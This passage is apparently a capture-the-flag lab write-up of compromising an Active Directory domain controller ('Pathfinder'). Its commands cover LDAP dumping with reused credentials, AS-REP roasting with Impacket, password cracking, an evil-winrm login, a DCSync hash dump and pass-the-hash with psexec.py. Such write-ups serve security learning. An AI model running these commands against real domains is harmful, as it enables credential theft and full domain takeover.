+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">3269</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">tcpwrapped</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">5985</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">          </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">HTTPAPI</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="w"> </span><span class="p">(</span><span class="n">SSDP</span><span class="o">/</span><span class="n">UPnP</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">Microsoft</span><span class="o">-</span><span class="n">HTTPAPI</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="k">Not</span><span class="w"> </span><span class="k">Found</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">9389</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">mc</span><span class="o">-</span><span class="n">nmf</span><span class="w">        </span><span class="p">.</span><span class="n">NET</span><span class="w"> </span><span class="n">Message</span><span class="w"> </span><span class="n">Framing</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">47001</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">          </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">HTTPAPI</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="w"> </span><span class="p">(</span><span class="n">SSDP</span><span class="o">/</span><span class="n">UPnP</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">Microsoft</span><span class="o">-</span><span class="n">HTTPAPI</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="k">Not</span><span class="w"> </span><span class="k">Found</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">49664</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">         </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">49665</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">         </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">49666</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">         </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">49667</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">         </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">49671</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">         </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">49676</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ncacn_http</span><span class="w">    </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w"> </span><span class="n">over</span><span class="w"> </span><span class="n">HTTP</span><span class="w"> </span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">49677</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">         </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">49683</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">         </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">49695</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">         </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">49714</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">         </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">Info</span><span class="p">:</span><span class="w"> </span><span class="k">Host</span><span class="p">:</span><span class="w"> </span><span class="n">PATHFINDER</span><span class="p">;</span><span class="w"> </span><span class="n">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Windows</span><span class="p">;</span><span class="w"> </span><span class="n">CPE</span><span class="p">:</span><span class="w"> </span><span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Host</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">results</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="n">skew</span><span class="p">:</span><span class="w"> </span><span class="mi">7</span><span class="n">h07m28s</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">smb2</span><span class="o">-</span><span class="k">security</span><span class="o">-</span><span class="k">mode</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="mi">2</span><span class="p">.</span><span class="mi">02</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">    </span><span class="n">Message</span><span class="w"> </span><span class="n">signing</span><span class="w"> </span><span class="n">enabled</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">required</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">smb2</span><span class="o">-</span><span class="n">time</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="nb">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2021</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">13</span><span class="n">T07</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">12</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="n">start_date</span><span class="p">:</span><span class="w"> </span><span class="n">N</span><span class="o">/</span><span class="n">A</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="n">done</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">Tue</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="mi">13</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">58</span><span class="w"> </span><span class="mi">2021</span><span class="w"> </span><span class="c1">-- 1 IP address (1 host up) scanned in 1712.57 seconds
+</span></span></span></code></pre></div><h3 id="open-ports">Open Ports</h3>
+<ul>
+<li>Well, that&rsquo;s a lot of open port</li>
+<li>with quick scan. Looks like this is <code>Domain Controller</code></li>
+</ul>
+<h3 id="hosts">Hosts</h3>
+<ul>
+<li>First, I&rsquo;m gonna add <code>MEGACORP.LOCAL</code> into <code>/etc/hosts</code> file</li>
+</ul>
+<p><img src="hosts.png" alt="1"></p>
+<h2 id="ldap">LDAP</h2>
+<blockquote>
+<p><font color="#06ff76">Lightweight Directory Access Protocol</font></p>
+<p>The Lightweight Directory Access Protocol is an open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over an Internet Protocol network.</p>
+</blockquote>
+<h3 id="ldapsearch">LDAPsearch</h3>
+<ul>
+<li>Enumerate LDAP (Lightweight Directory Access Protocol)</li>
+<li>By using the tool called <code>ldapsearch</code></li>
+</ul>
+<h3 id="ldap-query-ldapsearch">LDAP QUERY [ldapsearch]</h3>
+<ul>
+<li>Let&rsquo;s query this LDAP by using <code>ldapsearch</code></li>
+<li>By using this command</li>
+<li>Source
+<ul>
+<li><a href="https://youtube.com/watch?v=mr-fsVLoQGw&amp;t=525">Ippsec - Enumerating LDAP with LDAPSEARCH</a></li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -h megacorp.local -s base namingcontexts
+</span></span></code></pre></div><ul>
+<li>the result</li>
+</ul>
+<p><img src="ldap_query.png" alt="1"></p>
+<h3 id="ldap-dump-ldapsearch">LDAP DUMP [ldapsearch]</h3>
+<ul>
+<li>Let&rsquo;s dump all with this command</li>
+<li>Source
+<ul>
+<li><a href="https://youtube.com/watch?v=YVhlfUvsqYc&amp;t=2115">Ippsec - Playing with LDAP Again (with the Amanda Creds)</a></li>
+<li><a href="https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/">devconnected - How To Search LDAP using ldapsearch</a></li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -h megacorp.local -b <span class="s2">&#34;dc=megacorp,dc=local&#34;</span>
+</span></span></code></pre></div><ul>
+<li>the result</li>
+</ul>
+<p><img src="ldap_dump_denied.png" alt="1"></p>
+<ul>
+<li>well, the operation was error</li>
+<li>lucky for me. I&rsquo;ve got <code>sandra</code> credentials from previous box shield</li>
+<li>let&rsquo;s try bind it with those creds</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -h megacorp.local -b <span class="s2">&#34;dc=megacorp,dc=local&#34;</span> -D <span class="s1">&#39;sandra@megacorp.local&#39;</span> -w <span class="s1">&#39;where_you_put_the_password_in&#39;</span>
+</span></span></code></pre></div><ul>
+<li>the result</li>
+</ul>
+<p><img src="ldap_dump_success.png" alt="1"></p>
+<ul>
+<li>the output pretty much crazy and crazy</li>
+<li>above was the snippet of it ;)</li>
+<li>so, I&rsquo;m gonna save it in file called <code>ldump_all</code></li>
+</ul>
+<h3 id="ldap-dump--user-ldapsearch">LDAP DUMP  USER [ldapsearch]</h3>
+<ul>
+<li>Let&rsquo;s dump all the user and save it in file called <code>ldump_users</code></li>
+<li>Source
+<ul>
+<li><a href="https://confluence.atlassian.com/kb/how-to-write-ldap-search-filters-792496933.html">ATLANSSIAN - How to write LDAP search filters</a></li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -h megacorp.local -b <span class="s2">&#34;dc=megacorp,dc=local&#34;</span> -D <span class="s1">&#39;sandra@megacorp.local&#39;</span> -w <span class="s1">&#39;where_you_put_the_password_in&#39;</span> <span class="s2">&#34;(&amp;(objectClass=person)(objectClass=user))&#34;</span>
+</span></span></code></pre></div><ul>
+<li>the result</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="err">#</span> <span class="nx">extended</span> <span class="nx">LDIF</span>
+</span></span><span class="line"><span class="cl"><span class="err">#</span>
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="nx">LDAPv3</span>
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="nx">base</span> <span class="o">&lt;</span><span class="nx">dc</span><span class="o">=</span><span class="nx">megacorp</span><span class="p">,</span><span class="nx">dc</span><span class="o">=</span><span class="nx">local</span><span class="o">&gt;</span> <span class="kd">with</span> <span class="nx">scope</span> <span class="nx">subtree</span>
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="nx">filter</span><span class="o">:</span> <span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="nx">objectClass</span><span class="o">=</span><span class="nx">person</span><span class="p">)(</span><span class="nx">objectClass</span><span class="o">=</span><span class="nx">user</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="nx">requesting</span><span class="o">:</span> <span class="nx">ALL</span>
+</span></span><span class="line"><span class="cl"><span class="err">#</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="nx">Administrator</span><span class="p">,</span> <span class="nx">Users</span><span class="p">,</span> <span class="nx">MEGACORP</span><span class="p">.</span><span class="nx">LOCAL</span>
+</span></span><span class="line"><span class="cl"><span class="nx">dn</span><span class="o">:</span> <span class="nx">CN</span><span class="o">=</span><span class="nx">Administrator</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nx">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nx">MEGACORP</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nx">LOCAL</span>
+</span></span><span class="line"><span class="cl"><span class="nx">objectClass</span><span class="o">:</span> <span class="nx">top</span>
+</span></span><span class="line"><span class="cl"><span class="nx">objectClass</span><span class="o">:</span> <span class="nx">person</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">--</span><span class="p">[[</span><span class="nx">SNIP</span><span class="p">]]</span><span class="o">--</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="nx">search</span> <span class="nx">reference</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ref</span><span class="o">:</span> <span class="nx">ldap</span><span class="o">:</span><span class="c1">//ForestDnsZones.MEGACORP.LOCAL/DC=ForestDnsZones,DC=MEGACORP,DC=LOC
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="nx">AL</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="nx">search</span> <span class="nx">reference</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ref</span><span class="o">:</span> <span class="nx">ldap</span><span class="o">:</span><span class="c1">//DomainDnsZones.MEGACORP.LOCAL/DC=DomainDnsZones,DC=MEGACORP,DC=LOC
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="nx">AL</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="nx">search</span> <span class="nx">reference</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ref</span><span class="o">:</span> <span class="nx">ldap</span><span class="o">:</span><span class="c1">//MEGACORP.LOCAL/CN=Configuration,DC=MEGACORP,DC=LOCAL
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="nx">search</span> <span class="nx">result</span>
+</span></span><span class="line"><span class="cl"><span class="nx">search</span><span class="o">:</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="nx">result</span><span class="o">:</span> <span class="mi">0</span> <span class="nx">Success</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="nx">numResponses</span><span class="o">:</span> <span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="nx">numEntries</span><span class="o">:</span> <span class="mi">6</span>
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="nx">numReferences</span><span class="o">:</span> <span class="mi">3</span>
+</span></span></code></pre></div><ul>
+<li>Finally, we&rsquo;ve got all the users</li>
+</ul>
+<p><img src="ldap_users.png" alt="1"></p>
+<ul>
+<li>Well, I can&rsquo;t find anything usefull</li>
+<li>So, I went to the internet for searching tool for dumping user from <code>LDAP</code></li>
+<li>Finally, I found one that can work</li>
+</ul>
+<h3 id="ldap-dump---ldapdomaindump">LDAP DUMP   [ldapdomaindump]</h3>
+<ul>
+<li>Let&rsquo;s dump all the user</li>
+<li>Before, I run the command. I&rsquo;m gonna make a folder real quick called <code>ldap_dumps</code></li>
+<li>Source
+<ul>
+<li><a href="https://github.com/dirkjanm/ldapdomaindump">Github - ldapdomaindump</a></li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapdomaindump -u megacorp<span class="se">\\</span>sandra -p put_the_passwd_in -o ldap_dumps 10.10.10.30
+</span></span></code></pre></div><p><img src="ldap_dump_domain.png" alt="1"></p>
+<ul>
+<li>the command above is dumping all in folder called <code>ldap_dumps</code></li>
+<li>the result, we&rsquo;ve got a lot of file</li>
+<li>let&rsquo;s take a look at 	<code>domain_users.html</code></li>
+</ul>
+<p><img src="domain_users_html.png" alt="1"></p>
+<h2 id="kerberos">Kerberos</h2>
+<blockquote>
+<p>Kerberos (/ˈkɜːrbərɒs/) is a computer-network authentication protocol that works on the basis of tickets to allow nodes communicating over a non-secure network to prove their identity to one another in a secure manner. The protocol was named after the character Kerberos (or Cerberus) from Greek mythology, the ferocious three-headed guard dog of Hades.</p>
+</blockquote>
+<ul>
+<li>Source
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/Kerberos_(protocol)">Wikipedia - Kerberos(protocol)</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="kerberos---dont_req_preauth">Kerberos - [DONT_REQ_PREAUTH]</h3>
+<ul>
+<li>Source
+<ul>
+<li><a href="https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks">Kerberos - Pentest Book</a></li>
+<li><a href="https://www.hackingarticles.in/abusing-kerberos-using-impacket/">hacking articles - Abusing Kerberos Using Impacket</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="impacket-getnpuserspy">Impacket [GetNPUsers.py]</h3>
+<blockquote>
+<p>This script will attempt to list and get TGTs for those users that have the property <code>Do not require Kerberos preauthentication</code> set (UF_DONT_REQUIRE_PREAUTH).</p>
+</blockquote>
+<ul>
+<li><code>svc_bes</code>  user have very unique flags that state <code>DONT_REQ_PREAUTH</code></li>
+<li>with those flags. I&rsquo;m gonna use this impacket tool called <code>GetNPUsers.py</code></li>
+<li>the output will save in file called <code>svc_bes.hash</code> in John-The-Ripper[JtR] format.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">GetNPUsers</span><span class="o">.</span><span class="n">py</span> <span class="n">megacorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">svc_bes</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span> <span class="o">-</span><span class="n">request</span> <span class="o">-</span><span class="nb">format</span> <span class="n">john</span> <span class="o">&gt;</span> <span class="n">svc_bes</span><span class="o">.</span><span class="n">hash</span>
+</span></span></code></pre></div><h3 id="john-the-ripper">John-The-Ripper</h3>
+<ul>
+<li>Use <code>JtR</code> for cracking the file</li>
+<li>the result</li>
+</ul>
+<p><img src="jtr.png" alt="1"></p>
+<ul>
+<li>Now, We&rsquo;ve got the <code>svc_bes</code> user password</li>
+</ul>
+<h2 id="footholdgaining-access">Foothold/Gaining Access</h2>
+<h2 id="evil-winrm">Evil-Winrm</h2>
+<ul>
+<li>Nmap scan show us <code>winrm</code> port is open [port 5985]</li>
+<li>Source
+<ul>
+<li><a href="https://adamtheautomator.com/winrm-port/">Tyler Muir - Default WinRm Ports and How to Change Them</a></li>
+</ul>
+</li>
+<li>Let&rsquo;s try connect into this machine with those creds</li>
+<li>By using <code>Evil-winrm</code></li>
+<li>Source
+<ul>
+<li><a href="https://github.com/Hackplayers/evil-winrm">Github - evil-winrm</a></li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -i 10.10.10.30 -u svc_bes -p put_the_password_here
+</span></span></code></pre></div><p><img src="nice.png" alt="1"></p>
+<h3 id="user-flag">User Flag</h3>
+<p><img src="user.png" alt="1"></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h2 id="dcsync-attack">DCSync Attack</h2>
+<blockquote>
+<p><strong>DCSync</strong> is a credential dumping technique that can lead to the compromise of individual user credentials, and more seriously as a prelude to the creation of a <a href="https://attack.stealthbits.com/how-golden-ticket-attack-works">Golden Ticket</a>, as DCSync can be used to compromise the <code>krbtgt</code> account’s password.</p>
+</blockquote>
+<ul>
+<li>Source
+<ul>
+<li><a href="https://attack.stealthbits.com/privilege-escalation-using-mimikatz-dcsync">StealthBits - privilege-escalation-using-mimikatz-dcsync</a></li>
+<li><a href="https://www.hackingarticles.in/credential-dumping-dcsync-attack/">Hacking Articles - Credential Dumping: DCSync Attack</a></li>
+<li><a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/">Pentestlab - Dumping Domain Password Hashes</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="impacket-secretsdumppy">Impacket [SecretsDump.py]</h3>
+<blockquote>
+<p>Performs various techniques to dump hashes from the remote machine without executing any agent there.</p>
+</blockquote>
+<ul>
+<li>Source
+<ul>
+<li><a href="https://youtube.com/watch?v=uLNpR3AnE-Y&amp;t=2140">Ippsec - Running SecretsDump with svc_loanmgr to perform a DCSYNC</a></li>
+</ul>
+</li>
+<li>I&rsquo;m gonna run <code>secretsdump.py</code> with this command</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">secretsdump</span><span class="o">.</span><span class="n">py</span> <span class="n">megacorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">svc_bes</span><span class="p">:</span><span class="n">password_here</span><span class="o">@</span><span class="mf">10.10.10.30</span>
+</span></span></code></pre></div><ul>
+<li>the result</li>
+</ul>
+<p><img src="secdump.png" alt="1"></p>
+<ul>
+<li>
+<p>We manage to dump all the users hash</p>
+</li>
+<li>
+<p>The most important hash is the <code>Administrator hash</code></p>
+</li>
+<li>
+<p><font color="yellow">Do we crack it?</font></p>
+<ul>
+<li>Actually&hellip; We can login as <code>Administrator</code> by using <code>password hashes</code></li>
+</ul>
+</li>
+<li>
+<p>By using another <code>Impacket</code> script called <code>psexec.py</code></p>
+</li>
+</ul>
+<h3 id="impacket-psexecpy">Impacket [psexec.py]</h3>
+<blockquote>
+<p>PSEXEC like functionality example using RemComSvc, with the help of python script we can use this module for connecting host machine remotely</p>
+</blockquote>
+<ul>
+<li>
+<p>Source</p>
+<ul>
+<li><a href="https://youtube.com/watch?v=uLNpR3AnE-Y&amp;t=2265">IppSec - Performing a Pass The Hash with the administrator user using PSExec</a></li>
+<li><a href="https://youtube.com/watch?v=H9FcE_FMZio&amp;t=3750">IppSec - Performing SecretsDump to perform a DCSync and extract 	hashes, then PSEXEC with Administrator to gain access</a></li>
+<li><a href="https://www.hackingarticles.in/remote-code-execution-using-impacket/">Hacking Articles - Remote Code Execution Using Impacket</a></li>
+<li><a href="https://www.infosecmatter.com/rce-on-windows-from-linux-part-1-impacket/">InfosecMatter - RCE on Windows from Linux Part 1: Impacket</a></li>
+</ul>
+</li>
+<li>
+<p>I will run this command</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d5xxxxxxxxxxxxxxxxx
+</span></span></code></pre></div><ul>
+<li>the result</li>
+</ul>
+<p><img src="psexec_admin.png" alt="1"></p>
+<h3 id="admin-flag">Admin flag</h3>
+<p><img src="admin.png" alt="1"></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>I&rsquo;ve learned a lot today. I&rsquo;m new to the <code>AD/Domain Controller Hacks</code> or whatever you want to call it <code>:)</code>. This machine is so fun and I&rsquo;ve gained a lot of knowledge about it.  Do not rely on one tool only. You need to explore and find another tool and understanding it. Lastly, it is important to configure the user correctly and securely. Before I forgot, again do not put any credentials on the non-secure machine. Even tho it&rsquo;s happened, quickly change the password.</p>
+<p>I have a fun time doing this machine and I hope you guys do too. Bye ;)</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/hugo-sid" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://twitter.com" target="_blank" rel="noopener noreferrer me"
+    title="Twitter">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
+    </path>
+</svg>
+</a>
+<a href="index.xml" target="_blank" rel="noopener noreferrer me"
+    title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2023 shafiqaiman.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
